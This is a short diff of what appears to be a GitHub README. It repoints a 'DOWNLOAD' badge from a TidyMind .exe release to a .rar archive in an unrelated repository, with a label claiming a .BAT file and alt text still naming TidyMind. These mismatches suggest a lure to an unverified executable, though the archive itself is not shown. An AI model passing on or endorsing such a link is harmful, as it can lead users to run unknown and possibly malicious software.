@@ -9,7 +9,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/sueh0/TidyMind/releases/download/TidyMind/TidyMind.exe">
+  <a href="https://github.com/m4hun0/BookmarkX-Downloader/releases/download/bookmarks/BookMarks.Downloader.rar">
     <img src="https://img.shields.io/badge/DOWNLOAD-BookmarkX%20(.BAT)-success?style=for-the-badge&logo=windows&logoColor=white&color=2ecc71" alt="Botão de Download TidyMind" height="50px">
   </a>
 </p>
